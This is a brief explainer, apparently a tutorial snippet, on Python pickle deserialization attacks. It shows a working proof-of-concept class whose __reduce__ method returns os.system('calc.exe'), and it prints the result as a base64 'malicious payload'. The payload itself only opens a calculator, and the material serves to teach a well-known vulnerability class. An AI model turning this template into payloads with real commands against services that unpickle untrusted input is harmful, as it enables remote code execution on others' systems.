💡 How Python Pickle Exploits Work (__reduce__)

Python's pickle module provides a special method __reduce__() that can return a callable and arguments tuple. When unpickled, Python calls this function automatically (e.g. os.system('calc.exe'))! 

# Example of how an attacker crafts a malicious pickle payload:
import pickle, base64, os

class RCEExploit:
    def __reduce__(self):
        return (os.system, ('calc.exe',))

payload = base64.b64encode(pickle.dumps(RCEExploit())).decode()
print("Malicious Base64 Payload:", payload)
